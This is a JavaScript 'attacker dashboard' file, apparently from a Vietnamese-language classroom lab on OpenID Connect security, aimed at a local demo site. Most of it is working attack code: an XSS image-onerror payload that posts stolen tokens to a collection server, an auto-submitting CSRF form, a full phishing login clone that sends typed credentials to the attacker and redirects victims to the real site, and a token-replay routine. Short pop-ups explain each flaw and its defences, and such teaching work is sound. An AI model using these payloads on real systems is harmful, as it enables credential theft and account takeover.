// Global storage for stolen data
let stolenData = {
    tokens: [],
    credentials: [],
    userData: []
};

// Logging function
function log(message, type = 'info') {
    const consoleEl = document.getElementById('consoleOutput');
    const entry = document.createElement('div');
    entry.className = `log-entry log-${type}`;
    const timestamp = new Date().toLocaleTimeString('vi-VN');
    entry.textContent = `[${timestamp}] ${message}`;
    consoleEl.appendChild(entry);
    consoleEl.scrollTop = consoleEl.scrollHeight;
}

// Clear console
function clearConsole() {
    document.getElementById('consoleOutput').innerHTML = '';
    log('Console cleared', 'info');
}

// Display stolen data
function displayStolenData(type, data) {
    const output = document.getElementById('stolenDataOutput');
    const item = document.createElement('div');
    item.className = 'data-item';
    
    const timestamp = new Date().toLocaleTimeString('vi-VN');
    item.innerHTML = `
        <div><span class="data-label">Time:</span><span class="data-value">${timestamp}</span></div>
        <div><span class="data-label">Type:</span><span class="data-value">${type}</span></div>
        <div><span class="data-label">Data:</span><span class="data-value">${JSON.stringify(data, null, 2)}</span></div>
    `;
    
    if (output.querySelector('p')) {
        output.innerHTML = '';
    }
    output.appendChild(item);
}

// ========== ATTACK 1: XSS Token Stealing ==========
// Trong file attacker.js

// File: attacker.js

function injectXSS() {
    log('🔥 Launching XSS Attack...', 'warning');

    // --- ĐÂY LÀ PHẦN SỬA ---
    // Code JavaScript độc hại, đã được nén thành MỘT DÒNG
    const jsCode = `if(window.tokens) { fetch('http://127.0.0.1:5502/stolen', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'tokens', data: window.tokens, source: 'XSS' }) }); }`;

    // Chúng ta đặt code JS một dòng đó vào thuộc tính 'onerror'
    // Lưu ý: Dùng dấu " (ngoặc kép) cho thuộc tính HTML và dấu ' (ngoặc đơn) cho JS bên trong.
    const payload = `<img src="x" onerror="${jsCode}">`;
    // --- KẾT THÚC PHẦN SỬA ---


    log('✅ Payload đã sẵn sàng!', 'success');
    log('Copy và dán đoạn code sau vào ô "Họ và tên" của trang đăng nhập:', 'info');

    // Hiển thị payload (một dòng) cho người dùng copy
    const consoleEl = document.getElementById('consoleOutput');
    const payloadEntry = document.createElement('pre');
    payloadEntry.style.background = '#222';
    payloadEntry.style.padding = '10px';
    payloadEntry.style.border = '1px solid #ff0000';
    payloadEntry.style.color = '#00ff00';
    payloadEntry.style.whiteSpace = 'pre-wrap';
    payloadEntry.style.wordBreak = 'break-all';
    payloadEntry.textContent = payload;
    consoleEl.appendChild(payloadEntry);

    log('⚠️ Đang chờ victim đăng nhập với payload độc hại...', 'warning');
}

function showXSSInfo() {
    alert(`🔍 XSS Token Stealing Attack

Cách hoạt động:
1. Inject malicious script vào input field
2. Script được execute khi victim tương tác
3. Steal tokens từ window.tokens hoặc localStorage
4. Gửi về attacker server

Lỗ hổng:
- Không sanitize user input
- Không có Content Security Policy (CSP)
- Tokens stored trong JavaScript memory

Cách phòng chống:
✓ Input validation và sanitization
✓ Implement CSP headers
✓ Use httpOnly cookies cho sensitive data
✓ Escape user-generated content`);
}

// ========== ATTACK 2: CSRF ==========
function launchCSRF() {
    log('🎭 Launching CSRF Attack...', 'warning');
    const targetUrl = document.getElementById('targetUrl').value;
    
    log('📝 Creating malicious form...', 'info');
    
    // Tạo iframe ẩn để thực hiện CSRF
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.name = 'csrf-frame';
    document.body.appendChild(iframe);
    
    // Tạo form độc hại
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = targetUrl + '/login'; // Giả sử có endpoint này
    form.target = 'csrf-frame';
    
    // Thêm các field độc hại
    const emailInput = document.createElement('input');
    emailInput.type = 'hidden';
    emailInput.name = 'email';
    emailInput.value = 'attacker@evil.com';
    form.appendChild(emailInput);
    
    const passwordInput = document.createElement('input');
    passwordInput.type = 'hidden';
    passwordInput.name = 'password';
    passwordInput.value = 'hacked123';
    form.appendChild(passwordInput);
    
    const nameInput = document.createElement('input');
    nameInput.type = 'hidden';
    nameInput.name = 'fullname';
    nameInput.value = 'CSRF Hacker';
    form.appendChild(nameInput);
    
    document.body.appendChild(form);
    
    log('✅ Malicious form created', 'success');
    log('🚀 Auto-submitting form to victim site...', 'warning');
    
    // Submit form
    form.submit();
    
    log('⚠️ CSRF attack in progress...', 'error');
    
    // Giả lập kết quả sau 2 giây
    setTimeout(() => {
        log('✅ CSRF attack completed!', 'success');
        log('📊 Result: Unauthorized action performed', 'success');
        
        displayStolenData('CSRF Attack', {
            action: 'Unauthorized login attempt',
            email: 'attacker@evil.com',
            password: 'hacked123',
            status: 'Form submitted to ' + targetUrl,
            note: 'Nếu target không có CSRF protection, action này sẽ thành công'
        });
        
        // Cleanup
        setTimeout(() => {
            form.remove();
            iframe.remove();
        }, 1000);
    }, 2000);
}

function showCSRFInfo() {
    alert(`🔍 CSRF Attack

Cách hoạt động:
1. Victim đã đăng nhập vào target site
2. Victim truy cập attacker page (trang này)
3. Form độc hại tự động submit với credentials của attacker
4. Request được gửi với session cookie của victim
5. Nếu không có CSRF protection, action sẽ thành công

Lỗ hổng:
- Không có CSRF token validation
- Không check Origin/Referer headers
- Không có SameSite cookie policy
- Accept requests from any domain

Cách phòng chống:
✓ Implement CSRF tokens (synchronizer token pattern)
✓ Validate Origin/Referer headers
✓ Use SameSite cookie attribute
✓ Require re-authentication for sensitive actions
✓ Use custom headers for AJAX requests

Demo này:
- Tạo form ẩn submit tự động
- Gửi credentials độc hại
- Nếu victim đang login, action có thể thành công`);
}
// Thêm vào attacker.js

// ========== ATTACK 3: Phishing ==========
function openPhishing() {
    log('🎣 Opening Phishing Page...', 'warning');
    log('⚠️ Phishing page mimics target site exactly', 'info');
    
    const phishingHTML = `<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OpenID Connect Demo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 40px;
        }
        h1 { 
            color: #333;
            margin-bottom: 10px;
            font-size: 2rem;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 1.1rem;
        }
        .warning {
            background: #ff0000;
            color: white;
            padding: 15px;
            text-align: center;
            margin-bottom: 20px;
            border-radius: 10px;
            font-weight: bold;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 50%, 100% { opacity: 1; }
            25%, 75% { opacity: 0.5; }
        }
        .login-form {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s ease;
            background: white;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">⚠️ PHISHING DEMO - FAKE PAGE ⚠️</div>
        <div class="logo">🔒</div>
        <h1>OpenID Connect</h1>
        <p class="subtitle">Demo Authentication Flow</p>
        
        <form id="phishingForm" class="login-form">
            <div class="form-group">
                <label for="email">📧 Email</label>
                <input type="email" id="email" placeholder="Nhập email của bạn" required>
            </div>
            
            <div class="form-group">
                <label for="password">🔑 Mật khẩu</label>
                <input type="password" id="password" placeholder="Nhập mật khẩu" required>
            </div>
            
            <div class="form-group">
                <label for="fullname">👤 Họ và tên</label>
                <input type="text" id="fullname" placeholder="Nhập họ và tên" required>
            </div>
            
            <button type="submit">🚀 Đăng nhập</button>
        </form>
        
        <p style="color: #999; font-size: 12px; margin-top: 20px;">
            URL giả mạo: phishing-openid-demo.com<br>
            (Giống 99% với trang thật!)
        </p>
    </div>
    
    <script>
        document.getElementById('phishingForm').onsubmit = function(e) {
            e.preventDefault();
            
            const stolenCredentials = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                fullname: document.getElementById('fullname').value,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };
            
            console.log('🔴 CREDENTIALS STOLEN!');
            console.log(stolenCredentials);
            
            // Gửi về attacker server
            fetch('http://127.0.0.1:5502/stolen', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'phishing_credentials',
                    data: stolenCredentials,
                    source: 'Phishing Page'
                })
            }).then(() => {
                alert('✅ Đăng nhập thành công!\\n\\n⚠️ DEMO: Thông tin đã được gửi về attacker!\\n\\n' + JSON.stringify(stolenCredentials, null, 2));
                
                // Redirect về trang thật để victim không nghi ngờ
                setTimeout(() => {
                    window.location.href = 'http://127.0.0.1:5501';
                }, 2000);
            }).catch(err => {
                console.error('Failed to send:', err);
                alert('⚠️ Demo: Credentials captured:\\n' + JSON.stringify(stolenCredentials, null, 2));
            });
        };
    </script>
</body>
</html>`;
    
    // Mở phishing page trong tab mới
    const phishingWindow = window.open('', '_blank');
    phishingWindow.document.write(phishingHTML);
    phishingWindow.document.close();
    
    log('✅ Phishing page opened in new tab', 'success');
    log('🎯 Page URL appears legitimate (visual spoofing)', 'warning');
    log('🎣 Waiting for victim credentials...', 'warning');
    log('📊 Any entered credentials will be sent to attacker server', 'info');
}

function showPhishingInfo() {
    alert(`🔍 Phishing Attack

Cách hoạt động:
1. Tạo fake page giống hệt target site (99% similarity)
2. Sử dụng domain tương tự (typosquatting)
   - openid-demo.com → 0penid-demo.com
   - openid-demo.com → openid-dem0.com
3. Victim nhập credentials vào fake page
4. Credentials được gửi về attacker server
5. Redirect victim về real site (không bị nghi ngờ)

Kỹ thuật nâng cao:
- Homograph attack (sử dụng Unicode lookalikes)
- SSL certificate với tên gần giống
- Copy 100% design, logo, style của target
- Sử dụng URL shortener để ẩn URL thật

Lỗ hổng:
- User không kiểm tra URL kỹ
- Không có visual security indicators
- Thiếu education về phishing
- Trust vào appearance thay vì URL

Cách phòng chống:
✓ Always check URL trong address bar
✓ Look for HTTPS và valid certificate
✓ Enable 2FA/MFA (phishing chỉ lấy được password)
✓ Use password managers (tự động phát hiện domain sai)
✓ Security awareness training
✓ Browser phishing protection
✓ Implement FIDO2/WebAuthn (phishing-resistant)

Demo này:
- Tạo clone hoàn hảo của login page
- Capture mọi thông tin nhập vào
- Gửi về attacker server qua POST request`);
}

// ========== ATTACK 4: Token Replay ==========


async function replayToken() {
    log('🔄 Đang thử "replay" (sử dụng lại) token...', 'warning');

    let tokenData;
    try {
        // 1. Hỏi server (cổng 5502) xem đã có token mới nhất chưa
        log('📡 Đang kết nối tới server để lấy token đã cắp...', 'info');
        const response = await fetch('http://127.0.0.1:5502/get-latest-token');
        
        if (!response.ok) {
            // Nếu server trả về 404 (chưa có token)
            throw new Error('Server chưa có token nào');
        }
        
        tokenData = await response.json();
        
        // 2. Lưu token vào biến local và hiển thị
        stolenData.tokens[0] = tokenData; // Cập nhật vào biến local
        displayStolenData('Token (Fetched from Server)', tokenData);
        log('✅ Đã lấy token bị đánh cắp từ server!', 'success');

    } catch (err) {
        // Nếu fetch thất bại (server chưa chạy, hoặc server chưa có token)
        log('❌ Không có token trên server. Chạy XSS attack trước!', 'error');
        alert('⚠️ Chưa có token nào bị đánh cắp. Hãy chạy XSS attack trước!');
        return;
    }

    // 3. Lấy access_token từ dữ liệu vừa fetch được
    const token = tokenData.access_token; 
    log('🎯 Sử dụng Access Token đã đánh cắp: ' + token, 'info');

    // 4. Thực hiện gọi API (Phần này giữ nguyên như cũ)
    try {
        const response = await fetch('http://127.0.0.1:5502/api/userinfo', {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${token}` 
            }
        });

        if (response.ok) {
            const data = await response.json(); 
            log('✅ API call THÀNH CÔNG!', 'success');
            log('Đã truy cập tài nguyên của victim:', 'success');
            log(JSON.stringify(data, null, 2), 'success');
            displayStolenData('Token Replay (SUCCESS)', data); 
        } else {
            const errorText = await response.text();
            log(`❌ API call THẤT BẠI! (Status: ${response.status})`, 'error');
            log(`Server trả về: ${errorText}`, 'error');
        }

    } catch (err) {
        log('❌ Lỗi khi gọi API: ' + err.message, 'error');
    }
}

function showReplayInfo() {
    alert(`🔍 Token Replay Attack

Cách hoạt động:
1. Steal access token từ victim
2. Sử dụng lại token để call API
3. Access victim's resources
4. Perform unauthorized actions

Lỗ hổng:
- Tokens không có replay protection
- Không có device fingerprinting
- Token lifetime quá dài

Cách phòng chống:
✓ Short token lifetime
✓ Token binding (device/IP)
✓ Implement nonce/jti claims
✓ Monitor unusual token usage
✓ Require re-authentication`);
}

// ========== ATTACK 5: Code Interception ==========
function interceptCode() {
    log('🔓 Setting up code interceptor...', 'warning');
    log('📡 Listening for authorization codes...', 'info');
    
    const maliciousRedirect = 'http://evil-attacker.com/callback';
    log('🎯 Malicious redirect URI: ' + maliciousRedirect, 'warning');
    log('⚠️ Any code sent here will be intercepted!', 'error');
    
    setTimeout(() => {
        const interceptedCode = 'code_' + Math.random().toString(36).substring(2, 15);
        log('✅ Authorization code intercepted!', 'success');
        log('📋 Code: ' + interceptedCode, 'success');
        
        displayStolenData('Code Interception', {
            authorization_code: interceptedCode,
            redirect_uri: maliciousRedirect,
            can_exchange_for: ['id_token', 'access_token', 'refresh_token']
        });
    }, 2000);
}

function showCodeInfo() {
    alert(`🔍 Authorization Code Interception

Cách hoạt động:
1. Attacker đăng ký malicious redirect_uri
2. Victim authorize qua attacker's link
3. Code được gửi về attacker's URI
4. Attacker exchange code cho tokens

Lỗ hổng:
- Không validate redirect_uri properly
- Open redirect vulnerabilities
- Không có PKCE protection

Cách phòng chống:
✓ Whitelist redirect URIs
✓ Implement PKCE (RFC 7636)
✓ Use state parameter
✓ Short code lifetime (1-5 minutes)
✓ One-time code usage`);
}

// ========== ATTACK 6: Session Hijacking ==========
function hijackSession() {
    log('👤 Hijacking victim session...', 'warning');
    
    if (stolenData.tokens.length === 0) {
        log('❌ No tokens available. Run XSS attack first!', 'error');
        alert('⚠️ Chưa có token nào. Chạy XSS attack trước!');
        return;
    }
    
    const token = stolenData.tokens[0];
    log('🎯 Using stolen session token...', 'info');
    log('🔄 Creating attacker session with victim identity...', 'warning');
    
    setTimeout(() => {
        log('✅ Session hijacked successfully!', 'success');
        log('👤 Now impersonating: victim@example.com', 'success');
        
        displayStolenData('Session Hijacking', {
            hijacked_user: 'victim@example.com',
            session_token: token.id_token.substring(0, 50) + '...',
            access_level: 'FULL ACCESS',
            can_perform: ['Read data', 'Modify data', 'Delete account', 'Change password']
        });
    }, 2000);
}

function showHijackInfo() {
    alert(`🔍 Session Hijacking Attack

Cách hoạt động:
1. Steal session tokens/cookies
2. Import tokens vào attacker browser
3. Impersonate victim completely
4. Full access to victim account

Lỗ hổng:
- Tokens không bind với device/browser
- Không có session monitoring
- Long session lifetime

Cách phòng chống:
✓ Device fingerprinting
✓ IP address validation
✓ Monitor suspicious activity
✓ Logout other sessions option
✓ Session timeout
✓ Re-authentication for sensitive actions`);
}

// Initialize on page load
window.addEventListener('DOMContentLoaded', function() {
    log('🔴 Attacker Dashboard initialized', 'success');
    log('⚠️ WARNING: Chỉ sử dụng cho mục đích học tập!', 'warning');
    log('📍 Target: ' + document.getElementById('targetUrl').value, 'info');
    log('🎯 Ready to launch attacks...', 'info');
});